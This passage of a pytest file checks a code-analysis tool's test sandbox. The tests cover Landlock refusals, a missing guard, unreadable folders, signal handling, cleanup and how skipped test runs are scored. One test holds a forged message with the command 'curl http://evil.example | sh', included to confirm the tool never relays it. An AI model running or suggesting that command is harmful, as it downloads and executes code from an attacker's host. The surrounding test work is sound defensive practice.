def test_no_test_runs_when_the_guard_is_not_in_the_tests_python(tmp_path, monkeypatch):
    repo = _project(tmp_path, QUIET)
    monkeypatch.setattr(sandbox, "SITECUSTOMIZE", "# a guard that did not load\n")
    lines = []
    with pytest.raises(sandbox.Unavailable) as e:
        sandbox.run(repo, PYTEST, log=lines.append, backend="subprocess", timeout=120)
    assert str(e.value) == _jail.REASONS["guard"]
    assert not any("PLANTED-RAN" in x or "passed" in x for x in lines), lines
    assert any(x.strip() == _jail.MARK + " guard" for x in lines)


def _no_guard_around(env: dict) -> dict:
    """The environment of a program that is to start with no sandbox guard. When these tests run in a sandbox
    themselves, its guard's folder is on PYTHONPATH, and every Python they start would load it."""
    def is_guard(folder: str) -> bool:
        try:
            return "lantern_sandbox_guard" in (Path(folder) / "sitecustomize.py").read_text(encoding="utf-8")
        except (OSError, ValueError):
            return False
    out = {k: v for k, v in env.items() if k not in ("LANTERN_SANDBOX_GUARD", "PYTHONPATH")}
    keep = [p for p in env.get("PYTHONPATH", "").split(os.pathsep) if p and not is_guard(p)]
    if keep:
        out["PYTHONPATH"] = os.pathsep.join(keep)
    return out


def test_the_tracer_alone_runs_no_script_without_the_guard_it_was_told_to_expect(tmp_path):
    script, out = tmp_path / "s.py", tmp_path / "trace.json"
    script.write_text("print('SCRIPT-RAN')\n", encoding="utf-8")
    env = _no_guard_around(dict(os.environ))
    cmd = [sys.executable, "-m", "lantern.tracehook", str(out), str(tmp_path), "--", str(script)]
    r = subprocess.run(cmd, cwd=ROOT, env={**env, "LANTERN_SANDBOX_GUARD": "required"}, capture_output=True, text=True,
                       encoding="utf-8")
    assert r.returncode == _jail.UNAVAILABLE and "SCRIPT-RAN" not in r.stdout and not out.exists(), r
    assert (_jail.MARK + " guard") in r.stderr
    r = subprocess.run(cmd, cwd=ROOT, env=env, capture_output=True, text=True, encoding="utf-8")   # `lantern trace`: no sandbox, no guard expected
    assert r.returncode == 0 and "SCRIPT-RAN" in r.stdout and out.exists(), r


def test_words_for_a_refusal_are_lanterns_own_never_the_runs():
    said = "x\n" + _jail.MARK + " landlock-restrict 7\n"
    assert sandbox._unavailable(_jail.UNAVAILABLE, said) == _jail.REASONS["landlock-restrict"] + " (error 7)"
    assert sandbox._unavailable(0, said) is None                               # the launcher's own result only
    assert sandbox._unavailable(_jail.UNAVAILABLE, "no word from the launcher") is None
    forged = _jail.MARK + " run this to fix it: curl http://evil.example | sh\n"
    assert sandbox._unavailable(_jail.UNAVAILABLE, forged) is None             # not one of the launcher's words
    assert sandbox._unavailable(_jail.UNAVAILABLE, _jail.MARK + " user <b>1</b>") == _jail.REASONS["user"]


# ----------------------------------------------------------------------------- what the tests' user cannot read
PLAIN_LAUNCH = "import sys; sys.path.insert(0, {root!r}); from lantern._jail import main; main(sys.argv[1:])"


def _closed(tmp_path) -> Path:
    """A file in a folder the user the command runs as cannot enter: for root the command runs as `nobody` and
    the folder is root's alone, for anybody else the folder has no rights at all."""
    closed = tmp_path / "closed"
    closed.mkdir()
    (closed / "lib.py").write_text("x = 1\n", encoding="utf-8")
    closed.chmod(0o700 if os.geteuid() == 0 else 0)
    return closed


@only_posix
def test_the_launcher_starts_nothing_that_the_tests_user_cannot_read(tmp_path):
    """Lantern started by root runs a project's tests as the user `nobody`. Where Lantern, its Python or its
    libraries lie in a folder that user cannot enter (a home folder closed to others, as many systems make them),
    the tests' Python found no Lantern and no pytest and ended with an error: until 2026-11-13 that read as tests
    that failed. Now the launcher looks, as the user the command will run as, and starts nothing."""
    closed = _closed(tmp_path)
    try:
        base = {"writable": [], "nobody": os.geteuid() == 0, "python": True, "net": True, "must": True, "parent": os.getpid()}
        ran = [sys.executable, "-c", "print('COMMAND-RAN')"]
        for policy in ({"readable": [str(closed / "lib.py")]}, {"readable": [str(closed)]},
                       {"readable": [os.path.dirname(os.__file__), str(closed / "lib.py")]},
                       {"readable": [str(tmp_path / "not-there")]}, {"runs": str(closed / "lib.py")},
                       {"runs": os.__file__}):                           # there, readable, and nothing one can run
            r = subprocess.run([sys.executable, "-I", "-c", PLAIN_LAUNCH.format(root=str(ROOT)), json.dumps({**base, **policy}),
                                "--", *ran], capture_output=True, text=True, encoding="utf-8", timeout=120)
            assert r.returncode == _jail.UNAVAILABLE and "COMMAND-RAN" not in r.stdout, (policy, r)
            assert (_jail.MARK + " unreadable") in r.stderr, (policy, r.stderr)
        # the safe twins: everything named can be read and run, or nothing is named (the cloud service's steps)
        for policy in ({"readable": [os.path.dirname(os.__file__), os.__file__], "runs": sys.executable}, {}, {"readable": []}):
            r = subprocess.run([sys.executable, "-I", "-c", PLAIN_LAUNCH.format(root=str(ROOT)), json.dumps({**base, **policy}),
                                "--", *ran], capture_output=True, text=True, encoding="utf-8", timeout=120)
            assert r.returncode == 0 and "COMMAND-RAN" in r.stdout and _jail.MARK not in r.stderr, (policy, r)
    finally:
        closed.chmod(0o700)


def test_the_words_for_what_cannot_be_read_are_lanterns_own():
    said = "sandbox: the user the tests run as cannot read /somewhere/lantern\n" + _jail.MARK + " unreadable\n"
    why = sandbox._unavailable(_jail.UNAVAILABLE, said)
    assert why == _jail.REASONS["unreadable"] and "cannot read" in why and "/somewhere" not in why
    assert sandbox._unavailable(1, said) is None                               # the launcher's own result only


def test_a_projects_tests_are_started_with_what_they_are_made_of_named(tmp_path, monkeypatch):
    """What the launcher is asked to look at: the Python that runs the tests, its own library, and Lantern's
    tracer. For another language's test runner, that program."""
    seen = {}

    def stream(cmd, cwd, env, timeout, log, **more):
        if os.name == "posix":
            seen["policy"] = json.loads(cmd[cmd.index("--") - 1])
        return 0, "", False

    monkeypatch.setattr(sandbox, "_stream", stream)
    sandbox.run(_project(tmp_path, QUIET), ["python", "-m", "pytest", "-q"], log=lambda m: None, backend="subprocess")
    if os.name != "posix":
        return
    policy = seen["policy"]
    assert policy["runs"] == sys.executable
    assert str(ROOT / "lantern" / "tracehook.py") in policy["readable"] and os.path.dirname(os.__file__) in policy["readable"]
    assert all(os.path.exists(p) for p in policy["readable"]), policy["readable"]
    js = tmp_path / "js"
    (js / "node_modules" / ".bin").mkdir(parents=True)
    (js / "package.json").write_text('{"scripts": {"test": "echo ok"}}', encoding="utf-8")
    runner = programs.find("sh")
    monkeypatch.setattr(sandbox.programs, "find", lambda name, path=None: runner)
    sandbox.run(js, ["npm", "test"], log=lambda m: None, backend="subprocess")
    assert seen["policy"]["runs"] == runner and seen["policy"]["readable"] == []


IN_A_CLOSED_FOLDER = '''
import json, sys
from pathlib import Path
sys.path.insert(0, sys.argv[1])
from lantern import sandbox
assert Path(sandbox.__file__).resolve().parent.parent == Path(sys.argv[1]).resolve(), sandbox.__file__
lines = []
try:
    r = sandbox.run(Path(sys.argv[2]), ["python", "-m", "pytest", "-q", "-s"], log=lines.append, backend="subprocess", timeout=120)
    print(json.dumps({"returncode": r["returncode"], "lines": lines}))
except sandbox.Unavailable as e:
    print(json.dumps({"refused": "Unavailable", "why": str(e), "lines": lines}))
'''


@pytest.mark.skipif(os.name != "posix" or os.geteuid() != 0, reason="needs root (the tests then run as another user)")
@pytest.mark.parametrize("closed", [True, False])
def test_lantern_in_a_folder_the_tests_user_cannot_enter_says_so_and_runs_nothing(closed, tmp_path):
    """The whole way, as root: a copy of Lantern in a folder that is root's alone, asked to run a project's tests.
    The twin: the same copy in a folder every user may enter runs them."""
    import shutil
    import tempfile
    place = Path(tempfile.mkdtemp(prefix="lantern-elsewhere-"))
    try:
        place.chmod(0o700 if closed else 0o755)
        shutil.copytree(ROOT / "lantern", place / "lantern", ignore=shutil.ignore_patterns("__pycache__"))
        repo = _project(tmp_path, QUIET)
        r = subprocess.run([sys.executable, "-I", "-c", IN_A_CLOSED_FOLDER, str(place), str(repo)], capture_output=True,
                           text=True, encoding="utf-8", timeout=300, cwd=tmp_path)
        assert r.returncode == 0, r.stderr[-2000:]
        said = json.loads(r.stdout.strip().splitlines()[-1])
        ran = any("PLANTED-RAN" in x for x in said["lines"])
        if closed:
            assert said.get("refused") == "Unavailable" and not ran, said
            assert said["why"] == _jail.REASONS["unreadable"], said
        else:
            assert said.get("returncode") == 0 and ran, said
    finally:
        shutil.rmtree(place, ignore_errors=True)


LAUNCH = ("import sys; sys.path.insert(0, {root!r}); import lantern._jail as j; "
          "j._landlock = lambda writable, net: ('restrict error 1', 'landlock-restrict', 1); j.main(sys.argv[1:])")


@only_posix
@pytest.mark.parametrize("must", [True, False])
def test_the_launcher_does_not_start_the_command_when_a_restriction_it_must_have_fails(must, tmp_path):
    mark = tmp_path / "ran.txt"
    policy = {"writable": [str(tmp_path)], "nobody": False, "python": True, "net": True, "must": must, "parent": os.getpid()}
    r = subprocess.run([sys.executable, "-I", "-c", LAUNCH.format(root=str(ROOT)), json.dumps(policy), "--",
                        sys.executable, "-c", f"open({str(mark)!r}, 'w').close()"], capture_output=True, text=True, encoding="utf-8")
    assert "sandbox: Landlock restrict error 1" in r.stderr
    if must:
        assert r.returncode == _jail.UNAVAILABLE and not mark.exists(), r
        assert (_jail.MARK + " landlock-restrict 1") in r.stderr
    else:   # the cloud worker's steps read a project and never run it: they say so and carry on, as before
        assert r.returncode == 0 and mark.exists() and "carrying on without it" in r.stderr and _jail.MARK not in r.stderr, r


# A Python that puts itself under sixteen Landlock rule sets (the most the kernel stacks; each one allows every
# write, so nothing changes for it), then asks the sandbox to run a project's tests: the launcher's own rule set is
# the seventeenth, and the kernel refuses it (E2BIG, 7). A real refusal by the real kernel. Where some rule sets are
# there already (these tests run in a sandbox themselves), it stops adding when the kernel takes no more.
STACKED = '''
import ctypes, json, os, sys
from pathlib import Path
from lantern import sandbox
libc = ctypes.CDLL(None, use_errno=True)
def one_more():
    fs = 1 << 1
    attr = (ctypes.c_uint64 * 1)(fs)
    rfd = libc.syscall(444, ctypes.byref(attr), ctypes.sizeof(attr), 0)
    class Beneath(ctypes.Structure):
        _pack_ = 1
        _fields_ = [("allowed_access", ctypes.c_uint64), ("parent_fd", ctypes.c_int32)]
    fd = os.open("/", 0o10000000 | os.O_CLOEXEC)
    assert libc.syscall(445, rfd, 1, ctypes.byref(Beneath(fs, fd)), 0) == 0
    os.close(fd)
    libc.prctl(38, 1, 0, 0, 0)
    done, error = libc.syscall(446, rfd, 0), ctypes.get_errno()
    os.close(rfd)
    assert done == 0 or error == 7, error
    return done == 0
for _ in range(int(sys.argv[2])):
    if not one_more():
        break
lines = []
try:
    r = sandbox.run(Path(sys.argv[1]), ["python", "-m", "pytest", "-q", "-s"], log=lines.append, backend="subprocess", timeout=120)
    print(json.dumps({"returncode": r["returncode"], "lines": lines}))
except Exception as e:
    print(json.dumps({"refused": type(e).__name__, "why": str(e), "lines": lines}))
'''


@needs_landlock
@pytest.mark.parametrize("stacked", [16, 0])
def test_no_test_runs_when_the_kernel_refuses_landlock(stacked, tmp_path):
    repo = _project(tmp_path, QUIET)
    r = subprocess.run([sys.executable, "-c", STACKED, str(repo), str(stacked)], cwd=ROOT, capture_output=True, text=True,
                       encoding="utf-8", timeout=300)
    assert r.returncode == 0, r.stderr[-2000:]
    said = json.loads(r.stdout.strip().splitlines()[-1])
    ran = any("PLANTED-RAN" in x for x in said["lines"])
    if stacked:
        assert said.get("refused") == "Unavailable" and not ran, said
        assert said["why"] == _jail.REASONS["landlock-restrict"] + " (error 7)"
        assert any("Landlock restrict error 7" in x for x in said["lines"])
    else:   # the safe twin: the same program with nothing in the way runs the tests
        assert said.get("returncode") == 0 and ran, said
        assert any("sandbox: Landlock on" in x for x in said["lines"])


@needs_landlock
def test_a_test_cannot_signal_its_launcher_where_the_kernel_can_refuse_it(tmp_path):
    if sandbox.landlock_abi() < 6:
        pytest.skip("needs a kernel whose Landlock can refuse signals (ABI 6, Linux 6.12)")
    repo = _project(tmp_path, "import os, signal\n\ndef test_it():\n    try:\n        os.kill(os.getppid(), signal.SIGKILL)\n"
                              "    except PermissionError:\n        print('LAUNCHER-NOT-SIGNALLED', flush=True)\n")
    lines = []
    r = sandbox.run(repo, PYTEST, log=lines.append, backend="subprocess", timeout=120)
    assert r["returncode"] == 0 and any("LAUNCHER-NOT-SIGNALLED" in x for x in lines), lines


@only_linux
def test_a_signal_a_test_sends_to_its_own_group_does_not_end_the_run(tmp_path):
    repo = _project(tmp_path, "import os, signal, time\n\ndef test_it():\n    got = []\n"
                              "    signal.signal(signal.SIGUSR1, lambda *a: got.append(1))\n"
                              "    os.kill(0, signal.SIGUSR1)\n    time.sleep(0.3)\n    assert got\n    print('STILL-HERE', flush=True)\n")
    lines = []
    r = sandbox.run(repo, PYTEST, log=lines.append, backend="subprocess", timeout=120)
    assert r["returncode"] == 0 and any("STILL-HERE" in x for x in lines), lines


@only_posix
def test_a_command_ended_by_a_signal_reads_the_same_as_before(tmp_path):
    """The cloud worker tells a crash (a negative result) from an error the analysis reported."""
    policy = {"writable": [str(tmp_path)], "nobody": False, "python": True, "net": True, "parent": os.getpid()}
    launch = f"import sys; sys.path.insert(0, {str(ROOT)!r}); from lantern._jail import main; main(sys.argv[1:])"
    for code, want in (("import os, signal; os.kill(os.getpid(), signal.SIGKILL)", -9), ("raise SystemExit(7)", 7)):
        rc, _out, timed_out = sandbox._stream([sys.executable, "-I", "-c", launch, json.dumps(policy), "--", sys.executable, "-c", code],
                                              tmp_path, dict(os.environ), 60, lambda line: None, ask=_jail.ASK)
        assert (rc, timed_out) == (want, False)


# ---------------------------------------------------------------------------- the launcher itself, on its own
LAUNCHER = f"import sys; sys.path.insert(0, {str(ROOT)!r}); from lantern._jail import main; main(sys.argv[1:])"
# what the program that starts the launcher may have left set, which the launcher inherits
FIRST = "import os, signal, sys\n{how}\nos.execv(sys.executable, [sys.executable] + sys.argv[1:])\n"
LEAVES = STARTS + "\nstart()\ntime.sleep(300)\n"          # a command that starts all three and stays


def _launch(tmp_path, code: str, how: str = "") -> subprocess.Popen:
    policy = {"writable": [str(tmp_path)], "nobody": False, "python": True, "net": True, "must": True, "parent": os.getpid()}
    cmd = [sys.executable, "-I", "-c", LAUNCHER, json.dumps(policy), "--", sys.executable, "-c", code]
    if how:
        cmd = [sys.executable, "-c", FIRST.format(how=how), *cmd[1:]]
    return subprocess.Popen(cmd, cwd=tmp_path, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                            encoding="utf-8", errors="replace", start_new_session=True)


@only_linux
def test_the_launcher_reads_its_commands_result_when_its_starter_ignored_the_news_of_a_child(tmp_path):
    """A program that ignores SIGCHLD hands that on to what it starts; the kernel then collects every child itself
    and the launcher would never learn how the command ended."""
    for how in ("signal.signal(signal.SIGCHLD, signal.SIG_IGN)", ""):
        p = _launch(tmp_path, "print('COMMAND-RAN', flush=True); raise SystemExit(7)", how)
        out = p.communicate(timeout=60)[0]
        assert p.returncode == 7 and "COMMAND-RAN" in out, (how, p.returncode, out)


@only_linux
@pytest.mark.parametrize("how", ["signal.pthread_sigmask(signal.SIG_BLOCK, {signal.SIGTERM})", ""])
def test_the_launcher_hears_a_stop_whatever_its_starter_held_back_and_however_often_it_is_asked(how, tmp_path, sweep):
    """Asked three times in a row: the second and third once arrived between two lines of the clean-up and could
    have cut it short. Now they wait in a queue and nothing interrupts the clean-up."""
    p = _launch(tmp_path, LEAVES, how)
    pids, _n, lines = _read_until_started(p)
    sweep.extend([*pids, p.pid])
    assert len(pids) == 3, lines
    for _ in range(3):
        os.kill(p.pid, signal.SIGTERM)
    out = p.communicate(timeout=30)[0]
    assert p.returncode == 128 + signal.SIGTERM and "Traceback" not in out, (p.returncode, out)
    assert _still_there(pids) == [], "a process the command started outlived the launcher"


DEAF = """
import ctypes, signal, subprocess, sys, time
ctypes.CDLL(None).prctl(36, 1, 0, 0, 0)            # what its command starts stays beneath it, as with the real launcher
signal.signal(signal.SIGTERM, signal.SIG_IGN)      # but it does not answer when asked to stop
kid = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(300)"], start_new_session=True)
print("STARTED", kid.pid, flush=True)
time.sleep(300)
"""


@only_linux
def test_a_launcher_that_does_not_answer_has_everything_beneath_it_ended_before_it_is(tmp_path, sweep):
    """Killing only the launcher's process group and session left what had moved to a session of its own."""
    lines, cancel = [], threading.Event()

    def log(line):
        lines.append(line)
        if line.startswith("STARTED"):
            cancel.set()
    rc, _out, timed_out = sandbox._stream([sys.executable, "-c", DEAF], tmp_path, dict(os.environ), 60, log,
                                          cancel=cancel, ask=0.3)
    pids = _started(lines)
    sweep.extend(pids)
    assert (rc, timed_out) == (None, False) and len(pids) == 1, lines
    assert any("the launcher did not answer when asked to stop" in x for x in lines), lines
    assert _still_there(pids) == [], "a process in a session of its own outlived a launcher that did not answer"


@only_linux
def test_a_launcher_that_was_stopped_is_woken_and_ends_everything(tmp_path, sweep):
    """On a kernel that cannot refuse it (Landlock before ABI 6), a test may send its launcher SIGSTOP. Here the
    signal comes from outside, which every kernel allows."""
    repo = _project(tmp_path, STARTS + "\ndef test_never_ends():\n    start()\n    time.sleep(300)\n")
    lines, cancel = [], threading.Event()

    def log(line):
        lines.append(line)
        if line.startswith("STARTED"):
            for run in list(sandbox._LIVE):
                os.kill(run.proc.pid, signal.SIGSTOP)
            cancel.set()
    r = sandbox.run(repo, PYTEST, log=log, backend="subprocess", timeout=120, cancel=cancel)
    pids = _started(lines)
    sweep.extend(pids)
    assert r["cancelled"] and len(pids) == 3, r["output_tail"]
    assert not any("did not answer" in x or "could not be ended" in x for x in lines), lines
    assert _still_there(pids) == [], "a process the tests started outlived a launcher that had been stopped"


@needs_root
def test_as_root_with_files_made_owner_only_the_guard_still_loads(tmp_path):
    """Root's own files are often made owner-only (umask 077). The tests run as `nobody`, who could then not read
    the folder of the guard; Python left it out without a word and the tests ran with no guard."""
    repo = _project(tmp_path, "import socket\n\ndef test_udp():\n    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
                              "    s.sendto(b'x', ('192.0.2.1', 9))\n")     # an address outside: refused with or
    #                                                                          without a network of the run's own
    for p in [repo, *repo.rglob("*")]:
        os.chmod(p, 0o755 if p.is_dir() else 0o644)
    old = os.umask(0o077)
    try:
        r = sandbox.run(repo, PYTEST, log=lambda line: None, backend="subprocess", timeout=120)
    finally:
        os.umask(old)
    assert r["returncode"] == 1 and any(b["what"].startswith("network sendto") for b in r["blocked"]), r["output_tail"]


# ---------------------------------------------------------------------------- deleting the sandbox's folder
@only_posix
def test_deleting_the_sandbox_folder_changes_nothing_a_link_in_it_points_at(tmp_path):
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "kept.txt").write_text("kept", encoding="utf-8")
    os.chmod(outside, 0o555)
    root = tmp_path / "lantern-sandbox-x"
    (root / "app" / "sub").mkdir(parents=True)
    (root / "app" / "sub" / "f.txt").write_text("x", encoding="utf-8")
    os.symlink(outside, root / "app" / "link-to-a-folder")
    os.symlink(outside / "kept.txt", root / "app" / "link-to-a-file")
    sandbox._make_read_only(root / "app")
    try:
        assert sandbox._rm(root) is True and not root.exists()
        assert stat.S_IMODE(outside.stat().st_mode) == 0o555, "the mode of a folder outside the sandbox was changed"
        assert (outside / "kept.txt").read_text(encoding="utf-8") == "kept"
    finally:
        os.chmod(outside, 0o755)


def test_a_folder_that_cannot_be_deleted_is_said_and_the_folder_it_is_in_keeps_its_mode(tmp_path, monkeypatch):
    holder = tmp_path / "holder"
    holder.mkdir()
    os.chmod(holder, 0o777)
    before = stat.S_IMODE(holder.stat().st_mode)
    root = holder / "lantern-sandbox-y"
    (root / "tmp").mkdir(parents=True)
    real = os.rmdir

    def rmdir(path, *a, **kw):
        if os.path.basename(os.fspath(path)) == "lantern-sandbox-y":
            raise PermissionError(13, "in use", os.fspath(path))
        return real(path, *a, **kw)
    monkeypatch.setattr(os, "rmdir", rmdir)
    assert sandbox._rm(root) is False and root.exists()
    assert stat.S_IMODE(holder.stat().st_mode) == before, "the mode of the folder that holds the sandbox was changed"
    monkeypatch.setattr(os, "rmdir", real)
    assert sandbox._rm(root) is True and sandbox._rm(root) is True   # and a second try, once it can be, deletes it


def test_a_temp_folder_that_stays_is_said_in_the_log(tmp_path, monkeypatch):
    repo = _project(tmp_path, QUIET)
    monkeypatch.setattr(sandbox, "_rm", lambda path: False)
    lines = []
    r = sandbox.run(repo, PYTEST, log=lines.append, backend="subprocess", timeout=120)
    assert r["returncode"] == 0
    assert any("its temp folder could not be deleted and is still there" in x for x in lines), lines
    monkeypatch.undo()
    for line in lines:
        if "still there: " in line:
            assert sandbox._rm(Path(line.split("still there: ", 1)[1])) is True


@only_posix
def test_what_a_test_locks_in_its_temp_folder_is_still_deleted(tmp_path, monkeypatch):
    """A test leaves a folder with every right taken off, a file inside. Before, the sandbox's folder stayed, with
    the copy of the project in it, and nothing said so."""
    repo = _project(tmp_path, "import os, tempfile\n\ndef test_it():\n    d = os.path.join(tempfile.gettempdir(), 'locked')\n"
                              "    os.mkdir(d)\n    open(os.path.join(d, 'f'), 'w').close()\n    os.chmod(d, 0)\n")
    seen, real = {}, sandbox._stream

    def spy(cmd, cwd, env, timeout, log, **more):
        seen["root"] = Path(cwd).parent
        seen["holder"] = stat.S_IMODE(os.stat(Path(cwd).parent.parent).st_mode)
        return real(cmd, cwd, env, timeout, log, **more)
    monkeypatch.setattr(sandbox, "_stream", spy)
    lines = []
    r = sandbox.run(repo, PYTEST, log=lines.append, backend="subprocess", timeout=120)
    assert r["returncode"] == 0, r["output_tail"]
    assert not seen["root"].exists(), "the sandbox's folder was left behind"
    assert stat.S_IMODE(os.stat(seen["root"].parent).st_mode) == seen["holder"]
    assert not any("could not be deleted" in x for x in lines)


# ---------------------------------------------------------------------------- reading the code carries on
def _shop(tmp_path) -> tuple[Path, Path]:
    import shutil
    repo = tmp_path / "shop"
    shutil.copytree(Path(__file__).parent / "fixtures" / "shop", repo, ignore=shutil.ignore_patterns(".lantern", "__pycache__"))
    out = repo / ".lantern"
    out.mkdir()
    return repo, out


def _results(out: Path) -> tuple[dict, dict, dict]:
    """(run.json's record of the test run, the readiness checks by id, evidence.json)"""
    trace = json.loads((out / "run.json").read_text(encoding="utf-8"))["trace"]
    rd = json.loads((out / "readiness.json").read_text(encoding="utf-8"))
    checks = {c["id"]: c for cat in rd["categories"] for c in cat["checks"]}
    return trace, checks, json.loads((out / "evidence.json").read_text(encoding="utf-8"))


def _files(folder: Path) -> dict:
    """Every file beneath `folder` with what is in it."""
    return {f.relative_to(folder).as_posix(): f.read_bytes() for f in sorted(folder.rglob("*")) if f.is_file()}


@pytest.mark.parametrize("what", ["not run", "ran"])
def test_the_analysis_carries_on_and_the_results_say_what_became_of_the_tests(what, tmp_path, monkeypatch):
    """Tests that were not run (no sandbox) are not tests that failed: the score leaves them out, the Evidence
    Report says what happened and names no test command to repeat, and a re-check that runs no tests gives the
    same results. The safe twin ("ran") is a test run that counts."""
    from lantern import pipeline
    from lantern.evidence import verify
    from lantern.graph import Graph
    monkeypatch.setenv("LANTERN_SANDBOX", "subprocess")
    if what == "not run":
        monkeypatch.setattr(sandbox, "SITECUSTOMIZE", "# a guard that did not load\n")
    repo, out = _shop(tmp_path)
    lines = []
    pipeline.analyze(repo, out, trace_cmd=["python", "-m", "pytest", "-q"], sandbox=True, offline=True, log=lines.append,
                     cancel=threading.Event())
    trace, checks, ev = _results(out)
    seen = [e for e in Graph.load(out / "graph.json").call_edges() if e.confidence == "observed"]
    sec = json.loads((out / "security.json").read_text(encoding="utf-8"))
    assert sec["counts"]["critical"] >= 1 and (out / "report.html").is_file()  # the findings are all there, every time
    limits = " ".join(ev["limits"])
    if what == "ran":
        assert trace["ran"] is True and "cancelled" not in trace and trace["returncode"] == 0 and seen
        assert trace["not_ended"] == []
        assert checks["tests-pass"]["status"] == "pass"
        assert ev["payload"]["run"]["trace"] == ["python", "-m", "pytest", "-q"] and "Runtime behavior beyond what" in limits
        return
    assert trace["observed_edges"] == 0 and trace["returncode"] is None and not seen   # nothing is called "seen running"
    assert checks["tests-pass"]["status"] == "skip", checks["tests-pass"]              # not "fail": they did not fail
    assert ev["payload"]["run"]["trace"] is None
    assert trace["ran"] is False and trace["unavailable"] == _jail.REASONS["guard"]
    assert any(x.startswith("trace") and "were not run" in x and _jail.REASONS["guard"] in x for x in lines), lines
    assert "not run" in checks["tests-pass"]["evidence"]
    assert "were not run, because the sandbox they run in could not be set up" in limits and _jail.REASONS["guard"] in limits
    again = verify(repo, ev["digest"], ev["payload"], offline=True)                   # no test command asked of the reader
    assert again["match"] and not again.get("refused"), again


@pytest.mark.parametrize("before", ["a finished check", "nothing yet"])
def test_tests_the_person_stopped_change_no_result_file(before, tmp_path, monkeypatch):
    """A stop takes nothing away: the run ends where the tests were stopped and writes nothing, so the results are
    still those of the last check that finished (with the calls its own test run saw, and its score)."""
    from lantern import pipeline
    monkeypatch.setenv("LANTERN_SANDBOX", "subprocess")
    repo, out = _shop(tmp_path)
    command = ["python", "-m", "pytest", "-q"]
    if before == "a finished check":
        pipeline.analyze(repo, out, trace_cmd=command, sandbox=True, offline=True, log=lambda line: None)
        assert json.loads((out / "run.json").read_text(encoding="utf-8"))["trace"]["returncode"] == 0
    was = _files(out)
    assert bool(was) == (before == "a finished check")
    cancel, lines = threading.Event(), []
    cancel.set()
    with pytest.raises(pipeline.Stopped) as e:
        pipeline.analyze(repo, out, trace_cmd=command, sandbox=True, offline=True, log=lines.append, cancel=cancel)
    assert e.value.not_ended == [] and "no result was changed" in str(e.value)
    assert _files(out) == was, "a stopped test run changed the results"
    assert any("stopped before they ended; the results are left as they were" in x for x in lines), lines
    assert not any(x.startswith("scan") for x in lines)            # the run ended there


def test_a_test_run_stopped_at_the_time_limit_is_said_so_in_the_score(tmp_path):
    from lantern.readiness import assess
    from lantern.engine import build_graph
    repo = _project(tmp_path, QUIET)
    g = build_graph(repo)
    said = {}
    for name, tr in (("limit", {"returncode": None, "timed_out": True}), ("failed", {"returncode": 1}), ("passed", {"returncode": 0})):
        rd = assess(g, None, {"trace": {"command": ["python", "-m", "pytest"], **tr}})
        said[name] = next(c for cat in rd["categories"] for c in cat["checks"] if c["id"] == "tests-pass")
    # Stopped by the clock: the tests did not finish. That is no pass, and since 2026-11-13 no failure either (the
    # release decision beside it always said so): the check earns nothing and its points stay in the sum.
    assert said["limit"]["status"] == "skip" and said["limit"].get("required") is True
    assert "stopped at the time limit" in said["limit"]["evidence"]
    assert "None" not in said["limit"]["evidence"]                 # it read "traced test run exited None"
    assert said["failed"]["status"] == "fail" and said["failed"]["evidence"] == "traced test run exited 1"
    assert said["passed"]["status"] == "pass"


# ---------------------------------------------------------------------------- the app: Stop, and what it is told
@pytest.fixture()
def app_with(tmp_path, monkeypatch):
    """`lantern serve` on a free port, and a way to add a project to it."""
    from http.server import ThreadingHTTPServer

    from test_server import call

    from lantern.server import App, Handler, Store
    monkeypatch.setenv("LANTERN_SANDBOX", "subprocess")
    store = Store(tmp_path / "home")
    store.root.mkdir()
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    Handler.app = App(store, "tok-123", httpd.server_address[1])
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    base = f"http://127.0.0.1:{httpd.server_address[1]}"

    def add(repo: Path) -> str:
        code, pj = call(base, "/api/projects", "POST", {"path": str(repo)})
        assert code in (200, 201, 202), pj
        return (pj.get("project") or pj)["id"]
    yield base, add
    httpd.shutdown()
    httpd.server_close()


def test_the_app_stops_a_test_run_when_asked_and_nothing_it_started_is_left(app_with, tmp_path, sweep):
    from test_server import call, wait
    base, add = app_with
    repo = _project(tmp_path, STARTS + "\ndef test_never_ends():\n    start()\n    time.sleep(300)\n")
    pid = add(repo)
    assert wait(base, call(base, f"/api/projects/{pid}/analyze", "POST", {"offline": True})[1]["id"], timeout=120)["status"] == "done"
    was = _files(repo)                                             # the project with the results of a finished check
    assert ".lantern/readiness.json" in was
    code, job = call(base, f"/api/projects/{pid}/trace", "POST", {"command": " ".join(PYTEST), "confirm": True})
    assert code == 202 and job["can_stop"] is True and job["status"] == "running", job
    end, pids = time.time() + 120, []
    while not pids and time.time() < end:
        pids = _started(call(base, f"/api/jobs/{job['id']}")[1]["log"])
        time.sleep(0.1)
    sweep.extend(pids)
    assert len(pids) >= 2, call(base, f"/api/jobs/{job['id']}")[1]["log"]
    assert call(base, f"/api/jobs/{job['id']}/stop", "POST", {}, token=None)[0] == 403        # not without the app's token
    assert call(base, "/api/jobs/nosuchjob/stop", "POST", {})[0] == 404
    assert all(_alive(p) for p in pids), "a refused request stopped the tests"
    t = time.monotonic()
    code, told = call(base, f"/api/jobs/{job['id']}/stop", "POST", {})
    assert code == 200 and told["stopping"] is True and told["id"] == job["id"], told
    done = wait(base, job["id"], timeout=120)
    assert time.monotonic() - t < 60
    r = done["result"]
    assert done["status"] == "done" and r["cancelled"] is True and r["ran"] is True and r["unavailable"] is None, done
    assert r["returncode"] is None and not r["timed_out"] and r["observed"] == 0 and r["not_ended"] == []
    assert r["summary"] is None and r["score_after"] == r["score_before"]
    assert _files(repo) == was, "a stopped test run changed the project's results"
    assert _still_there(_must_end(pids)) == [], "a process the tests started outlived the Stop"
    assert call(base, f"/api/jobs/{job['id']}/stop", "POST", {})[0] == 200                    # once more, after the end: no harm
    code, job2 = call(base, f"/api/projects/{pid}/analyze", "POST", {"offline": True})        # a job with nothing to stop
    assert code == 202 and job2["can_stop"] is False
    code, e = call(base, f"/api/jobs/{job2['id']}/stop", "POST", {})
    assert code == 400 and "cannot be stopped" in e["error"], e
    assert wait(base, job2["id"], timeout=120)["status"] == "done"                             # and it was not stopped


def test_the_app_is_told_when_the_tests_were_not_run_and_why(app_with, tmp_path, monkeypatch):
    from test_server import call, wait
    base, add = app_with
    monkeypatch.setattr(sandbox, "SITECUSTOMIZE", "# a guard that did not load\n")
